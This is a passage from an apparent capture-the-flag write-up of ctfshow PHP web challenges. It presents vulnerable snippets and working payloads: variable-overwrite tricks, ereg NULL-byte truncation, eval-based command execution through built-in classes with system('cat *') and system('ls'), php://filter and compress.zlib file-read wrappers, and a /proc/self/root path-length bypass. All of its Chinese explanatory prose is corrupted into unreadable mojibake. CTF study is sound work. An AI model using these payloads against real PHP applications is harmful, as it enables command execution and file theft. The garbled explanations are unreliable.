class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><ul><li><p>Êú¨È¢òËÄÉÊü•ÂèòÈáèË¶ÜÁõñÂíå<code>die()</code>ÁöÑÁü•ËØÜ</p></li><li><p><code>$$a = $$b</code>ÂèØ‰ª•Á±ª‰ºº‰∫éÔºåÂ∞Ü$aÁöÑÂú∞ÂùÄÊåáÂêë$b</p><p>ÊâÄ‰ª•Êó†ËÆ∫$bÊÄé‰πàÊîπÂèòÂÄºÔºå$aÁöÑÂÄºÈÉΩ‰ºöÂíå$b‰∏ÄÊ†∑</p></li><li><p><code>die()</code>ÂáΩÊï∞ËôΩÁÑ∂‰ºöÁªàÊ≠¢Á®ãÂ∫èÔºå‰ΩÜÂêåÊó∂‰πü‰ºöËæìÂá∫Êã¨Âè∑ÂÜÖÁöÑÁªàÊ≠¢ÊèêÁ§∫‰ø°ÊÅØ</p></li><li><p>Êú¨È¢òÂà©Áî®ÂèòÈáèË¶ÜÁõñÂíå<code>die()</code>ÂáΩÊï∞ÁöÑÁâπÊÄß</p><ol><li>ÂÖàÂØπgetÁöÑÂÜÖÂÆπËøõË°åË¶ÜÁõñÔºå‰∏î‰∏çËÉΩË¶ÜÁõñerrorÔºåÊâÄ‰ª•Ë¶ÅË¶ÜÁõñsucesÔºåÂç≥?suces&#x3D;flagÔºåÊ≠§Êó∂suces&#x3D;&gt;flagÁöÑÂú∞ÂùÄ</li><li>ÂÜçÂØπpostÁöÑÂÜÖÂÆπËøõË°åË¶ÜÁõñÔºå‰∏î‰∏çËÉΩÂ∞ÜflagÁõ¥Êé•Ë¶ÜÁõñÔºåÊâÄ‰ª•Âè™ËÉΩerror&#x3D;sucesÔºåÊ≠§Êó∂error&#x3D;&gt;flagÁöÑÂú∞ÂùÄ</li><li>Ê≠§Êó∂Êó†ËÆ∫ËøõÂÖ•Âì™‰∏™<code>die()</code>ÂáΩÊï∞ÔºåÈÉΩÂèØ‰ª•ËæìÂá∫<code>$flag</code>ÁöÑÂÄº</li></ol></li></ul><p>Payload:</p><blockquote><p>GET:?suces&#x3D;flag</p><p>POST:error&#x3D;suces</p></blockquote><h4 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$v1</span><span class="token operator">!=</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>Âä†‰∫ÜÈôêÂà∂ÔºåPayloadÂêå104</p><h4 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107(parse_str)"></a>web107(parse_str)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p><strong>parse_str</strong>($v1,$v2); &#x2F;&#x2F;Êääv1ÁöÑÂÄºÁõ∏Â∫îÁöÑÊç¢ÊàêÈîÆÂÄºÂØπÂÜçÂ≠òÂÖ•v2(Êï∞ÁªÑ)<br>v1&#x3D;flag&#x3D;114&amp;index&#x3D;300ÁöÑËØùÔºå<br>v2Â∞±ÂèòÊàê‰∏Ä‰∏™Êï∞ÁªÑÔºåÂÜÖÂÆπ‰∏∫flag‚Äì&gt;114      index‚Äì&gt;300ÔºàÂàÜ‰∏∫Ëøô‰∏§‰∏™ÈîÆÂÄºÂØπÔºâ</p><p>ÊâÄ‰ª•Âè™ÈúÄË¶ÅËÆ©‰º†ÂÖ•ÁöÑflag md5ÂÄº‰∏év3‰∏ÄÊ†∑Â∞±ÂèØ</p><p>Payload:</p><blockquote><p>POST:v1&#x3D;flag&#x3D;47bce5c74f589f4867dbd57e9ca9f808</p><p>GET:?v3&#x3D;aaa</p></blockquote><h4 id="we108-ereg-NULLÊà™Êñ≠ÊºèÊ¥û"><a href="#we108-ereg-NULLÊà™Êñ≠ÊºèÊ¥û" class="headerlink" title="we108(ereg NULLÊà™Êñ≠ÊºèÊ¥û)"></a>we108(ereg NULLÊà™Êñ≠ÊºèÊ¥û)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//Âè™Êúâ36dÁöÑ‰∫∫ÊâçËÉΩÁúãÂà∞flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>ereg (‚Äú^[a-zA-Z]+$‚Äù, $_GET[‚Äòc‚Äô])&#x3D;&#x3D;&#x3D;FALSE</p><p>ereg()ÂáΩÊï∞Áî®ÊåáÂÆöÁöÑÊ®°ÂºèÊêúÁ¥¢‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤‰∏≠ÊåáÂÆöÁöÑÂ≠óÁ¨¶‰∏≤,Â¶ÇÊûúÂåπÈÖçÊàêÂäüËøîÂõûtrue,Âê¶Âàô,ÂàôËøîÂõûfalse„ÄÇÊêúÁ¥¢Â≠ó ÊØçÁöÑÂ≠óÁ¨¶ÊòØÂ§ßÂ∞èÂÜôÊïèÊÑüÁöÑ„ÄÇ</p><p>ÁªìÂêàereg()ÂáΩÊï∞Áî®Ê≥ïÔºåÊêúÁ¥¢‰∏çÂà∞ÊåáÂÆöÂ≠óÁ¨¶‰∏≤Â∞±‰ºöËøîÂõûFALSE</p><p>ÊâÄ‰ª•Ë¶ÅËÆ©c‰∏≠ÊúâÂ≠óÊØçÔºå‰ΩÜ‰∏çËÉΩÂá∫Áé∞ÂÖ∂‰ªñ‰∏úË•ø</p><p>ereg ÂáΩÊï∞Â≠òÂú® NULL Êà™Êñ≠ÊºèÊ¥ûÔºåÂèØ‰ª•ÁªïËøáÊ≠£ÂàôËøáÊª§Ôºå‰ΩøÁî® %00 Êà™Êñ≠„ÄÇ</p><p>0x36dÔºåËΩ¨ÂçÅËøõÂà∂ÊòØ877„ÄÇ</p><p>Payload:<code>c=a%00778</code></p><h4 id="web109-phpÂÜÖÁΩÆÁ±ªÁöÑ‰ΩøÁî®"><a href="#web109-phpÂÜÖÁΩÆÁ±ªÁöÑ‰ΩøÁî®" class="headerlink" title="web109(phpÂÜÖÁΩÆÁ±ªÁöÑ‰ΩøÁî®)"></a>web109(phpÂÜÖÁΩÆÁ±ªÁöÑ‰ΩøÁî®)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>ÁúãÂà∞echo newÂ∞ùËØïÂèçÂ∞ÑÁ±ª</p><p>PayloadÔºö</p><blockquote><p>?v1&#x3D;Reflectionclass&amp;v2&#x3D;system(‚Äòtac fl36dg.txt‚Äô)</p><p>?v1&#x3D;Exception&amp;v2&#x3D;system(‚Äòcat *‚Äô)  ÂºÇÂ∏∏Â§ÑÁêÜ</p><p>?v1&#x3D;class{ public function __construct(){ system(‚Äòls‚Äô); } };&amp;v2&#x3D;a  Áî®ÂåøÂêçÁ±ªÁªïËøá </p></blockquote><p>v1&#x3D;ÂÜÖÁΩÆÁ±ª&amp;v2&#x3D;system(‚Äòls‚Äô)Âç≥ÂèØ php‰∏≠‰ºöÂÖàÊâßË°ålsÂëΩ‰ª§ÁÑ∂ÂêéÊääÁªìÊûú‰Ωú‰∏∫ÂèÇÊï∞ÂÜçÊâßË°å‰ΩÜlsÁöÑÁªìÊûúÂ∑≤ÁªèË¢´ËæìÂá∫‰∫Ü</p><h4 id="web110-FilesystemIterator-class"><a href="#web110-FilesystemIterator-class" class="headerlink" title="web110(FilesystemIterator class)"></a>web110(FilesystemIterator class)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>[The FilesystemIterator class](<a href="https://www.php.net/manual/zh/class.filesystemiterator.php">PHP: FilesystemIterator - Manual</a>)</p><p>phpÂÜÖÁΩÆÁ±ª Âà©Áî® FilesystemIterator Ëé∑ÂèñÊåáÂÆöÁõÆÂΩï‰∏ãÁöÑÊâÄÊúâÊñá‰ª∂</p><p>Payload:<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p><h4 id="web111-GLOBALS"><a href="#web111-GLOBALS" class="headerlink" title="web111(GLOBALS)"></a>web111(GLOBALS)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$$v1</span></span> = &amp;<span class="token interpolation"><span class="token variable">$$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>Ê≥®ÊÑè PHP ÁöÑÂáΩÊï∞ÂÖ∑ÊúâËØçÊ≥ï‰ΩúÁî®Âüü</p><p>Âú®ÂáΩÊï∞ÂÜÖÈÉ®Êó†Ê≥ïË∞ÉÁî®Â§ñÈÉ®ÁöÑÂèòÈáèÔºåÈô§ÈùûËøõË°å‰º†ÂèÇ„ÄÇËøôÈÅìÈ¢òÊó†ÈùûÊ≥®ÊÑè‰ª•‰∏ãÂá†ÁÇπÔºö</p><ol><li>Êàë‰ª¨ÊúÄÁªàË¶ÅÂæóÂà∞ $flag ÁöÑÂÄºÔºåÂ∞±ÈúÄË¶Å var_dump($$v1) ‰∏≠ÁöÑ $v1 ‰∏∫ flagÔºåÂç≥ $v2 Ë¶Å‰∏∫ flagÔºåËøôÊ†∑ $$v2 Â∞±‰∏∫ $flagÔºå&amp;$$v2 Â∞±‰∏∫ $flag ÂØπÂ∫îÁöÑÂÄº</li><li>URL ‰º†ÂèÇÊó∂ $v2 ‰∏çËÉΩÁõ¥Êé•‰º†‰∏∫ flagÔºåÂê¶Âàô $flag ‰ºöÂõ†‚ÄúÂáΩÊï∞ÂÜÖÈÉ®Êó†Ê≥ïË∞ÉÁî®Â§ñÈÉ®ÂèòÈáè‚ÄùÁöÑÈôêÂà∂ËÄåÂØºËá¥ÂÖ∂ËøîÂõû null</li><li>Ë¶ÅÊÉ≥Ë∑®ËøáËØçÊ≥ï‰ΩúÁî®ÂüüÁöÑÈôêÂà∂ÔºåÊàë‰ª¨ÂèØ‰ª•Áî® GLOBALS Â∏∏ÈáèÊï∞ÁªÑÔºåÂÖ∂‰∏≠ÂåÖÂê´‰∫Ü $flag ÈîÆÂÄºÂØπÔºåÂ∞±ÂèØ‰ª•Â∞Ü $flag ÁöÑÂÄºËµãÁªô $$v1</li></ol><p>PayloadÔºö<code>?v1=ctfshow&amp;v2=GLOBALS</code></p><h4 id="web112-is-file"><a href="#web112-is-file" class="headerlink" title="web112(is_file)"></a>web112(is_file)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>Ë¶ÅÊ±Ç‰º†ÂÖ•ÁöÑfile‰∏çÊòØÊñá‰ª∂Ôºå‰ΩÜËøòËÉΩhighlight_fileÔºåËøôÂ∞±Ë¶ÅËØ¥Êòéis_fileÂíåhighlight_fileÂØπ‰∫éÊñá‰ª∂ÁöÑÂà§Êñ≠Ôºöis_fileËÆ§‰∏∫‰º™ÂçèËÆÆ‰∏çÊòØÊñá‰ª∂Ôºåhighlight_fileËÆ§‰∏∫‰º™ÂçèËÆÆÊòØÊñá‰ª∂ÔºåÊâÄ‰ª•ËøôÈáå‰º†ÂÖ•filter‰º™ÂçèËÆÆÂç≥ÂèØ„ÄÇ</p><p>Payload:</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php<br>compress.zlib:&#x2F;&#x2F;flag.php</p></blockquote><p><a href="https://www.novel.tools/decode/UCS-2BE">UCS-2BE Text Decoder</a></p><h4 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>1.Âà©Áî®ÂáΩÊï∞ÊâÄËÉΩÂ§ÑÁêÜÁöÑÈïøÂ∫¶ÈôêÂà∂ËøõË°åÁõÆÂΩïÊ∫¢Âá∫Ôºö ÂéüÁêÜÔºö&#x2F;proc&#x2F;self&#x2F;root‰ª£Ë°®Ê†πÁõÆÂΩïÔºåËøõË°åÁõÆÂΩïÊ∫¢Âá∫ÔºåË∂ÖËøáis_fileËÉΩÂ§ÑÁêÜÁöÑÊúÄÂ§ßÈïøÂ∫¶Â∞±‰∏çËÆ§‰∏∫ÊòØ‰∏™Êñá‰ª∂‰∫Ü„ÄÇ payload: <code>file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/ self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se lf/root/proc/self/root/var/www/html/flag.php</code></p><p>2.Âà©Áî®php‰∏≠zip‰º™ÂçèËÆÆ Áî®Ê≥ï[Ê∫ê‰∫éphpÂÆòÊñπÊèê‰æõÁöÑ‰∏Ä‰∫õ‰æãÂ≠ê]Ôºö compress.zlib:&#x2F;&#x2F;file.gz compress.zlib:&#x2F;&#x2F;file.bz2 payload: <code>file=compress.zlib://flag.php</code></p><h4 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Â∏àÂÇÖ‰ª¨Â±ÖÁÑ∂tqlÈÉΩÊòØÈùûÈ¢ÑÊúü ÂìºÔºÅ"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 